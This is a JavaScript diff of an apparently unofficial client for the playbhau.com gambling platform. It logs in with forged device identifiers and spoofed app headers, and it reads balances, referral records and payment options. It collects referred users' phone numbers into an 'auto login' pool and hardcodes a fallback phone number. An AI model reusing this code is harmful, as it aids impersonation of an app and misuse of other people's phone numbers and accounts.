-          unusedNumbers.push(phone); // Track locally to avoid same-batch duplicates
-          showToast(`Auto-saved referral number: ${phone}`, "success");
-        } catch (saveError) {
-          console.error(`Manual Auto Save: Failed to save referral phone ${phone}:`, saveError);
-          
-          // Check if it's a duplicate error
-          const errorMsg = saveError.message || '';
-          if (errorMsg.toLowerCase().includes('duplicate') || 
-              errorMsg.toLowerCase().includes('already exists') ||
-              errorMsg.toLowerCase().includes('exists')) {
-            duplicateCount++;
-            console.log(`Manual Auto Save: Phone ${phone} is a duplicate (already exists in pool)`);
-          } else {
-            showToast(`Failed to save referral number ${phone}: ${saveError.message}`, "error");
+  function openFilePicker() {
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.accept = 'image/*';
+    input.style.display = 'none';
+    document.body.appendChild(input);
+    
+    input.addEventListener('change', function(e) {
+      const file = e.target.files[0];
+      if (file) {
+        showToast('📸 Image selected. You can copy the number from it.', 'success');
+        const manualNumber = prompt('Please type the account number you see in the image:');
+        if (manualNumber && manualNumber.trim().length > 0) {
+          const inputField = document.getElementById('cardNumberInput');
+          if (inputField) {
+            inputField.value = manualNumber.trim().replace(/\s/g, '');
+            showToast('✅ Number entered.', 'success');
           }
         }
       }
-      
-      console.log(`Manual Auto Save: Processed ${processedCount} referrals, added ${addedCount} new numbers, skipped ${duplicateCount} duplicates, ${invalidCount} invalid`);
-      
-      if (addedCount > 0) {
-        await updateNumberDisplayFromServer();
-        if (currentUnused.length === 0 && addedCount === availableSlots) {
-          showToast(`✅ All ${addedCount} slots filled from referrals!`, "success");
-        } else {
-          showToast(`✅ ${addedCount} referral number(s) saved successfully!`, "success");
-        }
-      } else {
-        if (duplicateCount > 0 || invalidCount > 0) {
-          showToast(`No new numbers added. ${duplicateCount} duplicates, ${invalidCount} invalid.`, "warning");
-        } else {
-          showToast("No eligible referral numbers found.", "warning");
-        }
+      document.body.removeChild(input);
+    });
+    
+    input.click();
+  }
+
+  // ─── TOAST ──────────────────────────────────────────────────────────────────
+  function showToast(msg, type='error'){
+    if(S._toastTimer){ clearTimeout(S._toastTimer); S._toastTimer=null; }
+    toast.textContent=msg;
+    toast.className='toast-notification '+type;
+    void toast.offsetWidth;
+    toast.classList.add('show');
+    S._toastTimer=setTimeout(()=>{ toast.classList.remove('show'); },4500);
+  }
+
+  // ─── API HELPERS ──────────────────────────────────────────────────────────
+  async function autoLoginAPI(action, extra={}){
+    const r=await fetch(AUTO_LOGIN_API,{
+      method:'POST',
+      headers:{'Content-Type':'application/json','apikey':SUPABASE_ANON_KEY,'Authorization':'Bearer '+SUPABASE_ANON_KEY},
+      body:JSON.stringify({action,...extra})
+    });
+    const d=await r.json();
+    if(!r.ok || d.ok!==true) throw new Error(d.error||'Auto Login API failed');
+    return d;
+  }
+
+  // ─── UI UPDATES ───────────────────────────────────────────────────────────
+  async function updateNumberDisplay(){
+    try{
+      const r=await autoLoginAPI('get_unused');
+      const nums=(r.numbers||[]).slice(0,3);
+      numberStatus.textContent=nums.length+' unused';
+      numberStatus.style.color=nums.length?'#34d399':'#6b7280';
+      numberList.innerHTML=nums.length?nums.map(n=>`<div class="number-item">📱 ${n.phone_number}</div>`).join(''):
+        '<span style="color:#6b7280;font-size:11px;">No unused numbers available</span>';
+    }catch(e){
+      numberStatus.textContent='0 unused';
+      numberList.innerHTML='<span style="color:#fb7185;font-size:11px;">Unable to load numbers</span>';
+    }
+  }
+
+  // ─── SESSION ──────────────────────────────────────────────────────────────
+  function saveSession(){
+    if(S.isLoggedIn && S.token){
+      try{ localStorage.setItem('bhau_session',JSON.stringify({
+        token:S.token, phone:S.phone, visitor:S.visitor, isLoggedIn:true
+      }));}catch(_){}
+    }
+  }
+  function loadSession(){
+    try{
+      const d=JSON.parse(localStorage.getItem('bhau_session'));
+      if(d?.isLoggedIn && d.token){
+        S.token=d.token; S.phone=d.phone||'8597630383';
+        S.visitor=d.visitor||'0bcbcd2bea0bde4737e38d0e23bbf654dfc9';
+        S.isLoggedIn=true;
+        return true;
       }
-      
-    } catch (error) {
-      console.error("Manual Auto Save: Critical error:", error);
-      console.error("Manual Auto Save: Error stack:", error.stack);
-      showToast("Error saving referral numbers: " + error.message, "error");
-    } finally {
-      autoSaveReferralsBtn.disabled = false;
-      autoSaveReferralsBtn.textContent = '📥 AUTO SAVE REFERRALS';
-    }
-  }
-
-  // ---- PANEL VISIBILITY CONTROL ----
-  function hideAutoNumberPanel() {
-    if (autoNumberPanel) {
-      autoNumberPanel.classList.add('hidden-panel');
-    }
-  }
-
-  function showAutoNumberPanel() {
-    if (autoNumberPanel) {
-      autoNumberPanel.classList.remove('hidden-panel');
-    }
-  }
-
-  // ---- SESSION MANAGEMENT ----
-  function saveSession() {
-    if (state.isLoggedIn && state.token) {
-      try {
-        const sessionData = {
-          token: state.token,
-          phone: state.phone,
-          visitor: state.visitor,
-          isLoggedIn: true
-        };
-        localStorage.setItem('bhau_session', JSON.stringify(sessionData));
-      } catch (e) {}
-    }
-  }
-
-  function loadSession() {
-    try {
-      const saved = localStorage.getItem('bhau_session');
-      if (saved) {
-        const data = JSON.parse(saved);
-        if (data.isLoggedIn && data.token) {
-          state.token = data.token;
-          state.phone = data.phone || '8597630383';
-          state.visitor = data.visitor || '0bcbcd2bea0bde4737e38d0e23bbf654dfc9';
-          state.isLoggedIn = true;
-          return true;
-        }
-      }
-    } catch (e) {}
+    }catch(_){}
     return false;
   }
+  function clearSession(){ try{ localStorage.removeItem('bhau_session'); }catch(_){} }
 
-  function clearSession() {
-    try {
-      localStorage.removeItem('bhau_session');
-    } catch (e) {}
-  }
-
-  // ---- TELEGRAM FUNCTIONS ----
-  async function sendTelegramMessage(message) {
-    try {
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      const response = await fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: message,
-          parse_mode: 'HTML'
-        })
-      });
-      const data = await response.json();
-      if (data.ok) {
-        return data.result || { message_id: null };
-      }
-      return null;
-    } catch (error) {
-      return null;
-    }
-  }
-
-  async function deleteTelegramMessage(messageId) {
-    if (!messageId) return;
-    try {
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteMessage`;
-      await fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          message_id: messageId
-        })
-      });
-    } catch (error) {}
-  }
-
-  // ---- API CALLS ----
-  async function login(phone, password) {
-    const visitor = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
-    const device_id = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
-    const req_date = Date.now();
-
-    const payload = {
-      userPhone: phone,
-      password: password,
-      deviceCode: device_id,
-      distinctId: device_id,
-      channel: 'h5',
-      channelId: 'Samsung',
-      lang: 'en_US',
-      platform: 'h5',
-      packageId: 2,
-      packageInfo: 'com.resulta.checka',
-      versionCode: '999',
-      deviceBrand: 'Android',
-      deviceModel: 'Unknown',
-      visitor: visitor,
-      reqDate: req_date,
-      ua: 'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36'
+  // ─── LOGIN ────────────────────────────────────────────────────────────────
+  async function login(phone,password){
+    const visitor=Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15);
+    const device_id=Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15);
+    const payload={
+      userPhone:phone, password, deviceCode:device_id, distinctId:device_id,
+      channel:'h5', channelId:'Samsung', lang:'en_US', platform:'h5',
+      packageId:2, packageInfo:'com.resulta.checka', versionCode:'999',
+      deviceBrand:'Android', deviceModel:'Unknown', visitor, reqDate:Date.now(),
+      ua:'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36'
     };
-
-    try {
-      const response = await fetch('https://api.bh2255.xyz/app/password/login', {
-        method: 'POST',
-        headers: {
-          'Accept': 'application/json, text/plain, */*',
-          'Content-Type': 'application/json',
-          'Origin': 'https://playbhau.com',
-          'Referer': 'https://playbhau.com/',
-          'User-Agent': 'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36'
-        },
-        body: JSON.stringify(payload)
+    try{
+      const r=await fetch('https://api.bh2255.xyz/app/password/login',{
+        method:'POST',
+        headers:{'Accept':'application/json, text/plain, */*','Content-Type':'application/json','Origin':'https://playbhau.com','Referer':'https://playbhau.com/','User-Agent':'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36'},
+        body:JSON.stringify(payload)
       });
-
-      if (response.status !== 200) {
-        const errMsg = response.status === 401 ? 'Login failed: Unauthorized' :
-                       response.status === 403 ? 'Access denied. Account may be banned.' :
-                       response.status === 404 ? 'Login service unavailable' :
-                       `Server error (${response.status})`;
-        showToast(errMsg, 'error');
+      if(r.status!==200){
+        const msgs={401:'Login failed: Unauthorized',403:'Access denied. Account may be banned.',404:'Login service unavailable'};
+        showToast(msgs[r.status]||`Server error (${r.status})`,'error');
         return false;
       }
-      const data = await response.json();
-
-      if (data.success && data.code === 0) {
-        let token = null;
-        const tokenData = data.data;
-        if (typeof tokenData === 'string' && tokenData.startsWith('eyJ')) {
-          token = tokenData;
-        } else if (typeof tokenData === 'object' && tokenData !== null) {
-          token = tokenData.accessToken || tokenData.token;
-        } else {
-          token = data.accessToken || data.token;
-        }
-
-        if (token) {
-          state.token = token;
-          state.isLoggedIn = true;
-          state.phone = phone;
-          state.visitor = visitor;
-          saveSession();
-          return true;
+      const d=await r.json();
+      if(d.success && d.code===0){
+        let token=null;
+        const td=d.data;
+        if(typeof td==='string' && td.startsWith('eyJ')) token=td;
+        else if(typeof td==='object' && td!==null) token=td.accessToken||td.token;
+        else token=d.accessToken||d.token;
+        if(token){
+          S.token=token; S.isLoggedIn=true; S.phone=phone; S.visitor=visitor;
+          saveSession(); return true;
         }
       }
-      
-      const errorMsg = data.msg || data.message || 'Login failed. Please try again.';
-      showToast(errorMsg, 'error');
+      showToast(d.msg||d.message||'Login failed. Please try again.','error');
       return false;
-    } catch (error) {
-      showToast('Network error: ' + error.message, 'error');
-      return false;
-    }
+    }catch(e){ showToast('Network error: '+e.message,'error'); return false; }
   }
 
-  async function getBalance() {
-    if (!state.token) return;
-    try {
-      const req_date = Date.now();
-      const payload = {
-        channel: 'h5',
-        channelId: 'Samsung',
-        lang: 'en_US',
-        visitor: state.visitor,
-        reqDate: req_date,
-        ua: 'Mozilla/5.0 (Linux; Android 13; 22087RA4DI)',
-        packageId: 2,
-        packageInfo: 'com.resulta.checka',
-        versionCode: '999',
-        isDemo: 1,
-        count: 1,
-        betAmount: 10
-      };
-      const headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Token': state.token,
-        'Visitor': state.visitor,
-        'Content-Type': 'application/json',
-        'Origin': 'https://playbhau.com',
-        'Referer': 'https://playbhau.com/',
-        'PackageId': '2'
-      };
-      const res = await fetch('https://api.bh2255.xyz/app/user/getBalanceV2?gameType=BigTurnTable', {
-        method: 'POST',
-        headers,
-        body: JSON.stringify(payload)
+  async function getBalance(){
+    if(!S.token) return;
+    try{
+      const payload={channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,reqDate:Date.now(),ua:'Mozilla/5.0 (Linux; Android 13; 22087RA4DI)',packageId:2,packageInfo:'com.resulta.checka',versionCode:'999',isDemo:1,count:1,betAmount:10};
+      const r=await fetch('https://api.bh2255.xyz/app/user/getBalanceV2?gameType=BigTurnTable',{
+        method:'POST',
+        headers:{'Accept':'application/json, text/plain, */*','Token':S.token,'Visitor':S.visitor,'Content-Type':'application/json','Origin':'https://playbhau.com','Referer':'https://playbhau.com/','PackageId':'2'},
+        body:JSON.stringify(payload)
       });
-      if (res.status === 200) {
-        const data = await res.json();
-        if (data.code === 0) {
-          const bal = data.data?.totalBalance || 0;
-          state.balance = bal;
-          balanceDisplay.textContent = bal.toFixed(2);
+      if(r.status===200){
+        const d=await r.json();
+        if(d.code===0){
+          const bal=d.data?.totalBalance||0;
+          S.balance=bal;
+          balanceDisplay.textContent=bal.toFixed(2);
           return bal;
         }
       }
       return null;
-    } catch (e) {
-      return null;
-    }
+    }catch(_){ return null; }
   }
 
-  // ---- REFERRAL API CALLS (NO AUTO-SAVE) ----
-  async function getReferralHistory(pageNo = 1) {
-    if (!state.token) return null;
-    try {
-      const req_date = Date.now();
-      const payload = {
-        channel: 'h5',
-        channelId: 'Samsung',
-        lang: 'en_US',
-        visitor: state.visitor,
-        packageId: 2,
-        packageInfo: 'com.resulta.checka',
-        reqDate: req_date,
-        ua: 'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36',
-        versionCode: '999',
-        pageNo: pageNo,
-        pageSize: 20,
-        startTime: '',
-        endTime: ''
-      };
-
-      const headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Content-Type': 'application/json',
-        'Token': state.token,
-        'Visitor': state.visitor,
-        'PackageId': '2',
-        'Origin': 'https://playbhau.com',
-        'Referer': 'https://playbhau.com/'
-      };
-
-      const res = await fetch('https://api.bh2255.xyz/app/inviteTask/getRecordList', {
-        method: 'POST',
-        headers,
-        body: JSON.stringify(payload)
+  // ─── REFERRAL ─────────────────────────────────────────────────────────────
+  async function getReferralHistory(pageNo=1){
+    if(!S.token) return null;
+    try{
+      const payload={channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,packageId:2,packageInfo:'com.resulta.checka',reqDate:Date.now(),ua:'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36',versionCode:'999',pageNo,pageSize:20,startTime:'',endTime:''};
+      const r=await fetch('https://api.bh2255.xyz/app/inviteTask/getRecordList',{
+        method:'POST',
+        headers:{'Accept':'application/json, text/plain, */*','Content-Type':'application/json','Token':S.token,'Visitor':S.visitor,'PackageId':'2','Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
+        body:JSON.stringify(payload)
       });
-      if (res.status === 200) {
-        const data = await res.json();
-        if (data.code === 0) {
-          const content = data.data?.content || [];
-          state.referralHistoryCache = content;
-          console.log(`Referral API: Fetched ${content.length} referrals (NOT auto-saved)`);
+      if(r.status===200){
+        const d=await r.json();
+        if(d.code===0){
+          const content=d.data?.content||[];
+          S.referralHistoryCache=content;
           return content;
         }
       }
       return null;
-    } catch (e) {
-      console.error("Referral API error:", e);
-      return null;
+    }catch(_){ return null; }
+  }
+
+  // ─── MANUAL AUTO-SAVE ──────────────────────────────────────────────────
+  async function manualAutoSaveReferrals(){
+    if(autoSaveReferralsBtn.disabled) return;
+    autoSaveReferralsBtn.disabled=true;
+    autoSaveReferralsBtn.textContent='⏳ Saving...';
+    try{
+      const unusedR=await autoLoginAPI('get_unused');
+      const currentUnused=unusedR.numbers||[];
+      if(currentUnused.length>=3){
+        showToast('All 3 slots are already occupied.','warning');
+        return;
+      }
+      const referrals=S.referralHistoryCache||[];
+      if(!referrals.length){
+        showToast('No referral history available. Please load Referral History first.','warning');
+        return;
+      }
+      const unusedNums=currentUnused.map(n=>n.phone_number);
+      const available=3-currentUnused.length;
+      let added=0, dupes=0, invalid=0;
+      for(const ref of referrals){
+        if(added>=available) break;
+        let phone=(ref.inviteUserPhone||'').toString().replace(/\D/g,'');
+        if(!phone || phone.length!==10 || !/^[6-9]\d{9}$/.test(phone)){ invalid++; continue; }
+        if(unusedNums.includes(phone)){ dupes++; continue; }
+        try{
+          await autoLoginAPI('save',{phone});
+          added++;
+          unusedNums.push(phone);
+          showToast(`Auto-saved referral: ${phone}`,'success');
+        }catch(e){
+          if(e.message?.toLowerCase().includes('duplicate')||e.message?.toLowerCase().includes('already exists')) dupes++;
+          else showToast(`Failed to save ${phone}: ${e.message}`,'error');
+        }
+      }
+      if(added>0){ await updateNumberDisplay(); showToast(`✅ ${added} new number(s) saved!`,'success'); }
+      else showToast(`No new numbers. ${dupes} duplicates, ${invalid} invalid.`,'warning');
+    }catch(e){ showToast('Error: '+e.message,'error'); }
+    finally{
+      autoSaveReferralsBtn.disabled=false;
+      autoSaveReferralsBtn.textContent='📥 AUTO SAVE REFERRALS';
     }
   }
 
-  // ---- TRANSACTION HISTORY ----
-  async function getDepositHistory(pageNo = 1) {
-    if (!state.token) return null;
-    try {
-      const req_date = Date.now();
-      const payload = {
-        channel: 'h5',
-        channelId: 'Samsung',
-        lang: 'en_US',
-        visitor: state.visitor,
-        packageId: 2,
-        packageInfo: 'com.resulta.checka',
-        reqDate: req_date,
-        ua: 'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36',
-        versionCode: '999',
-        pageNo: pageNo,
-        pageSize: 20
-      };
+  // ─── PANEL CONTROL ──────────────────────────────────────────────────────
+  function showPanel(html){
+    dynamicContent.innerHTML=html;
+    dynamicContent.style.display='block';
+    document.querySelectorAll('.menu-item').forEach(el=>el.classList.remove('active-option'));
+    S.isPanelOpen=true;
+    autoNumberPanel?.classList.add('hidden-panel');
+  }
+  function closePanel(){
+    dynamicContent.innerHTML='';
+    dynamicContent.style.display='none';
+    document.querySelectorAll('.menu-item').forEach(el=>el.classList.remove('active-option'));
+    S.currentPanel=null;
+    S.isPanelOpen=false;
+    autoNumberPanel?.classList.remove('hidden-panel');
+    updateNumberDisplay();
+  }
+  window._closePanel=closePanel;
 
-      const headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Content-Type': 'application/json',
-        'Token': state.token,
-        'Visitor': state.visitor,
-        'PackageId': '2',
-        'Origin': 'https://playbhau.com',
-        'Referer': 'https://playbhau.com/'
-      };
-
-      const response = await fetch('https://api.bh2266.xyz/app/user/balance', {
-        method: 'POST',
-        headers,
-        body: JSON.stringify(payload)
+  // ─── DEPOSIT ──────────────────────────────────────────────────────────────
+  async function renderDeposit(){
+    S.currentPanel='deposit';
+    try{
+      const r=await fetch('https://api.bh556677ww.com/app/pay/balance/list',{
+        method:'POST',
+        headers:{'Accept':'application/json','Content-Type':'application/json','token':S.token,'packageid':'2','Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
+        body:JSON.stringify({channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,packageId:2,packageInfo:'com.resulta.checka',reqDate:Date.now(),ua:'Mozilla/5.0',versionCode:'999'})
       });
-
-      if (response.status === 200) {
-        const data = await response.json();
-        if (data.code === 0) {
-          return data.data || [];
-        }
-      }
-      return null;
-    } catch (e) {
-      return null;
-    }
-  }
-
-  async function getWithdrawHistory(pageNo = 1) {
-    if (!state.token) return null;
-    try {
-      const req_date = Date.now();
-      const payload = {
-        channel: 'h5',
-        channelId: 'Samsung',
-        lang: 'en_US',
-        visitor: state.visitor,
-        packageId: 2,
-        packageInfo: 'com.resulta.checka',
-        reqDate: req_date,
-        ua: 'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36',
-        versionCode: '999',
-        pageNo: pageNo,
-        pageSize: 20
-      };
-
-      const headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Content-Type': 'application/json',
-        'Token': state.token,
-        'Visitor': state.visitor,
-        'PackageId': '2',
-        'Origin': 'https://playbhau.com',
-        'Referer': 'https://playbhau.com/'
-      };
-
-      const response = await fetch('https://api.bh2266.xyz/app/pay/paid/log', {
-        method: 'POST',
-        headers,
-        body: JSON.stringify(payload)
+      if(r.status===200){ const d=await r.json(); if(d.code===0) S.depositAmounts=d.data||[]; }
+    }catch(_){}
+    try{
+      const r=await fetch('https://api.bh556677ww.com/app/pay/type/active/list',{
+        method:'POST',
+        headers:{'Accept':'application/json','Content-Type':'application/json','token':S.token,'packageid':'2','Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
+        body:JSON.stringify({channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,packageId:2,packageInfo:'com.resulta.checka',reqDate:Date.now(),channelUser:0,ua:'Mozilla/5.0',versionCode:'999'})
       });
+      if(r.status===200){ const d=await r.json(); if(d.code===0) S.paymentMethods=d.data||[]; }
+    }catch(_){}
 
-      if (response.status === 200) {
-        const data = await response.json();
-        if (data.code === 0) {
-          return data.data || [];
-        }
-      }
-      return null;
-    } catch (e) {
-      return null;
-    }
-  }
-
-  // ---- GAME FUNCTIONS ----
-  async function getFanTanUrl() {
-    if (!state.token) return null;
-    try {
-      const headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Token': state.token,
-        'Visitor': state.visitor,
-        'Origin': 'https://playbhau.com',
-        'Referer': 'https://playbhau.com/',
-        'PackageId': '2'
-      };
-      const res = await fetch('https://ltapi.game712.com/iGaming/common/getGameStart?id=27873&otherGame=true', {
-        method: 'GET',
-        headers
-      });
-      if (res.status === 200) {
-        const data = await res.json();
-        if (data.code === 0 && data.success) {
-          let url = data.data?.gameUrl || '';
-          if (url) {
-            url = decodeURIComponent(url.replace(/\\/g, ''));
-            return { success: true, game_name: 'Fan Tan', game_url: url };
-          }
-        }
-      }
-    } catch (e) {}
-    return { success: true, game_name: 'Fan Tan', game_url: 'https://skylinedja.evo-games.com/entry?params=Y2FzaW5vX2lkPXNreWxpbmVkamEwMDAwMDEKZ2FtZT1mYW50YW4Kc2lnbmF0dXJlPUZqeGZWRjZBM2x5TVpQMXF0Wkk2QXVWX1NkLTYwd1lLTWhTMTJZUEt1cXlsU0UyYWljUGNjYzI4N3NpVzlSM1VJRmlnUzhyQkw1aWRxdGZfbWF4U3R3CnVhX2xhdW5jaF9pZD0xOGM5ZTIxZWZkMTQzMDU2OWVmYzQ1MzAKdGFibGVfaWQ9RmFuVGFuMDAwMDAwMDAwMQpzaXRlPTEKandzaD1leUpyYVdRaU9pSXhOek01TkRRNE5EQXhOemsxSWl3aVlXeG5Jam9pUlZNeU5UWWlmUQpwbGF5X21vZGU9cmVhbF9tb25leQo&JSESSIONID=t7hc2g2imsdb4ndjt7reclgnapiyjh5x518c0e66&embedded' };
-  }
-
-  async function getChickenRoadUrl() {
-    if (!state.token) return null;
-    try {
-      const headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Token': state.token,
-        'Visitor': state.visitor,
-        'Origin': 'https://playbhau.com',
-        'Referer': 'https://playbhau.com/',
-        'PackageId': '2'
-      };
-      const res = await fetch('https://ltapi.game712.com/iGaming/common/getGameStart?id=41285&otherGame=true', { method: 'GET', headers });
-      if (res.status === 200) {
-        const data = await res.json();
-        if (data.code === 0 && data.success) {
-          let url = data.data?.gameUrl || '';
-          if (url) {
-            url = decodeURIComponent(url.replace(/\\/g, ''));
-            return { success: true, game_name: 'Chicken Road 2', game_url: url };
-          }
-        }
-      }
-    } catch (e) {}
-    return null;
-  }
-
-  async function spinTurntable(betAmount = 10, count = 1) {
-    if (!state.token) return null;
-    try {
-      const req_date = Date.now();
-      const payload = {
-        channel: 'h5',
-        channelId: 'Samsung',
-        lang: 'en_US',
-        visitor: state.visitor,
-        reqDate: req_date,
-        ua: 'Mozilla/5.0 (Linux; Android 13)',
-        packageId: 2,
-        packageInfo: 'com.resulta.checka',
-        versionCode: '999',
-        isDemo: 1,
-        count,
-        betAmount
-      };
-      const headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Content-Type': 'application/json',
-        'token': state.token,
-        'packageid': '2',
-        'visitor': state.visitor,
-        'Origin': 'https://playbhau.com',
-        'Referer': 'https://playbhau.com/'
-      };
-      const res = await fetch('https://api.bh2255.xyz/app/turntable/order/create', {
-        method: 'POST',
-        headers,
-        body: JSON.stringify(payload)
-      });
-      if (res.status === 200) {
-        const data = await res.json();
-        if (data.code === 0) {
-          return data;
-        }
-      }
-      return null;
-    } catch (e) {
-      return null;
-    }
-  }
-
-  async function claimVipReward() {
-    if (!state.token) return null;
-    try {
-      const req_date = Date.now();
-      const payload = {
-        channel: 'h5',
-        channelId: 'Samsung',
-        lang: 'en_US',
-        visitor: state.visitor,
-        reqDate: req_date,
-        ua: 'Mozilla/5.0',
-        packageId: 2,
-        packageInfo: 'com.resulta.checka',
-        versionCode: '999',
-        level: 1
-      };
-      const headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Content-Type': 'application/json',
-        'token': state.token,
-        'packageid': '2',
-        'visitor': state.visitor,
-        'Origin': 'https://playbhau.com',
-        'Referer': 'https://playbhau.com/'
-      };
-      const res = await fetch('https://api.bh556677wplus.com/app/vip/getVipLevelReward', {
-        method: 'POST',
-        headers,
-        body: JSON.stringify(payload)
-      });
-      if (res.status === 200) {
-        const data = await res.json();
-        if (data.code === 0) {
-          return data;
-        }
-      }
-      return null;
-    } catch (e) {
-      return null;
-    }
-  }
-
-  // ---- DEPOSIT HELPERS ----
-  async function getDepositAmounts() {
-    if (!state.token) return;
-    try {
-      const req_date = Date.now();
-      const payload = {
-        channel: 'h5',
-        channelId: 'Samsung',
-        lang: 'en_US',
-        visitor: state.visitor,
-        packageId: 2,
-        packageInfo: 'com.resulta.checka',
-        reqDate: req_date,
-        ua: 'Mozilla/5.0',
-        versionCode: '999'
-      };
-      const headers = {
-        'Accept': 'application/json',
-        'Content-Type': 'application/json',
-        'token': state.token,
-        'packageid': '2',
-        'Origin': 'https://playbhau.com',
-        'Referer': 'https://playbhau.com/'
-      };
-      const res = await fetch('https://api.bh556677ww.com/app/pay/balance/list', {
-        method: 'POST',
-        headers,
-        body: JSON.stringify(payload)
-      });
-      if (res.status === 200) {
-        const data = await res.json();
-        if (data.code === 0) {
-          state.depositAmounts = data.data || [];
-          return state.depositAmounts;
-        }
-      }
-      return null;
-    } catch (e) { return null; }
-  }
-
-  async function getPaymentMethods() {
-    if (!state.token) return;
-    try {
-      const req_date = Date.now();
-      const payload = {
-        channel: 'h5',
-        channelId: 'Samsung',
-        lang: 'en_US',
-        visitor: state.visitor,
-        packageId: 2,
-        packageInfo: 'com.resulta.checka',
-        reqDate: req_date,
-        channelUser: 0,
-        ua: 'Mozilla/5.0',
-        versionCode: '999'
-      };
-      const headers = {
-        'Accept': 'application/json',
-        'Content-Type': 'application/json',
-        'token': state.token,
-        'packageid': '2',
-        'Origin': 'https://playbhau.com',
-        'Referer': 'https://playbhau.com/'
-      };
-      const res = await fetch('https://api.bh556677ww.com/app/pay/type/active/list', {
-        method: 'POST',
-        headers,
-        body: JSON.stringify(payload)
-      });
-      if (res.status === 200) {
-        const data = await res.json();
-        if (data.code === 0) {
-          state.paymentMethods = data.data || [];
-          return state.paymentMethods;
-        }
-      }
-      return null;
-    } catch (e) { return null; }
-  }
-
-  async function createDeposit(amount, payTypeId, balanceId, payTag) {
-    if (!state.token) return null;
-    try {
-      const req_date = Date.now();
-      const payload = {
-        channel: 'h5',
-        channelId: 'Samsung',
-        lang: 'en_US',
-        visitor: state.visitor,
-        reqDate: req_date,
-        ua: 'Mozilla/5.0',
-        packageId: 2,
-        packageInfo: 'com.resulta.checka',
-        versionCode: '999',
-        balanceId: String(balanceId),
-        payTag: payTag || 'PAYMENT_CENTER_PAY',
-        payTypeId: String(payTypeId),
-        rechargeBalance: 0,
-        payCategory: 1
-      };
-      const headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Content-Type': 'application/json',
-        'token': state.token,
-        'packageid': '2',
-        'visitor': state.visitor,
-        'Origin': 'https://playbhau.com',
-        'Referer': 'https://playbhau.com/'
-      };
-      const res = await fetch('https://api.bh2255.xyz/app/pay/income', {
-        method: 'POST',
-        headers,
-        body: JSON.stringify(payload)
-      });
-      if (res.status === 200) {
-        const data = await res.json();
-        if (data.code === 0) return data;
-      }
-      return null;
-    } catch (e) {
-      return null;
-    }
-  }
-
-  function getBalanceIdForAmount(amount) {
-    for (const item of state.depositAmounts) {
-      if (parseFloat(item.balance) === parseFloat(amount)) return String(item.id);
-    }
-    return null;
-  }
-
-  // ---- WITHDRAW HELPERS ----
-  async function getWithdrawCards() {
-    if (!state.token) return;
-    try {
-      const req_date = Date.now();
-      const payload = {
-        channel: 'h5',
-        channelId: 'Samsung',
-        lang: 'en_US',
-        visitor: state.visitor,
-        packageId: 2,
-        packageInfo: 'com.resulta.checka',
-        reqDate: req_date,
-        ua: 'Mozilla/5.0',
-        versionCode: '999'
-      };
-      const headers = {
-        'Accept': 'application/json',
-        'Content-Type': 'application/json',
-        'token': state.token,
-        'packageid': '2',
-        'Origin': 'https://playbhau.com',
-        'Referer': 'https://playbhau.com/'
-      };
-      const res = await fetch('https://api.bh556677ww.com/app/card/info', {
-        method: 'POST',
-        headers,
-        body: JSON.stringify(payload)
-      });
-      if (res.status === 200) {
-        const data = await res.json();
-        if (data.code === 0) {
-          const cards = data.data || [];
-          state.withdrawCards = Array.isArray(cards) ? cards : (cards.list || []);
-          state.cardList = state.withdrawCards;
-          
-          if (state.withdrawCards.length > 0 && state.selectedCard === null) {
-            const firstCardId = parseInt(state.withdrawCards[0].id || state.withdrawCards[0].cardId);
-            if (!isNaN(firstCardId)) {
-              state.selectedCard = firstCardId;
-            }
-          }
-          return state.withdrawCards;
-        }
-      }
-      return null;
-    } catch (e) { return null; }
-  }
-
-  async function apiAddCard(name, number, ifsc, email) {
-    if (!state.token) return { success: false, msg: 'Not logged in' };
-    try {
-      const req_date = Date.now();
-      const payload = {
-        channel: 'h5',
-        channelId: 'Samsung',
-        lang: 'en_US',
-        visitor: state.visitor,
-        cardName: name,
-        cardNumber: number,
-        email: email || '',
-        ifsCode: ifsc,
-        smsCode: '',
-        packageId: 2,
-        packageInfo: 'com.resulta.checka',
-        reqDate: req_date,
